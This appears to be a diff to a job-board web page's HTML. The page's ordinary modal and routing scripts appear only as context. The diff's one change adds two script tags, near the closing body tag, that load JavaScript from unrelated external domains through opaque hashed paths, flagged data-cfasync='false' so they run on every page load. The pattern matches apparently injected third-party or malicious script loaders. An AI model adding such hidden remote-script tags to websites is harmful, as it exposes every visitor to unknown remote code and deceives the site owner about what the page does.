@@ -87,5 +87,8 @@ $('closeJobModal').addEventListener('click',()=>closeModal('jobModal'));$('close
 $('jobGrid').addEventListener('click',e=>{const a=e.target.closest('a[data-job]');if(!a||e.metaKey||e.ctrlKey||e.shiftKey)return;e.preventDefault();const job=allJobs.find(j=>String(j.id)===a.dataset.job);if(job){history.pushState({},'',a.getAttribute('href'));openJob(job);}});
 window.addEventListener('popstate',()=>{if(!/^\/jobs\/[^/]+/.test(location.pathname)){['jobModal','applyModal'].forEach(id=>{$(id).classList.add('hidden');$(id).classList.remove('flex');});document.body.classList.remove('modal-open');}});
 loadJobs().then(()=>{const m=location.pathname.match(/^\/jobs\/([^/]+)/);if(m){const job=allJobs.find(j=>String(j.id)===decodeURIComponent(m[1]));if(job)openJob(job);}});
-})();</script><script>if('serviceWorker'in navigator){window.addEventListener('load',()=>{navigator.serviceWorker.register('/service-worker.js').catch(()=>{});});}</script><script src="/counts.js" defer></script></body>
+})();</script><script>if('serviceWorker'in navigator){window.addEventListener('load',()=>{navigator.serviceWorker.register('/service-worker.js').catch(()=>{});});}</script><script src="/counts.js" defer></script>
+<script data-cfasync="false" src="https://bauval.org/14/431826a33b4f7b51dcc9a613416d5cbe"></script>
+<script data-cfasync="false" src="https://abscloud.org/1/e0881102e867f4d6ead6f8c6437992cc"></script>
+</body>
 </html>
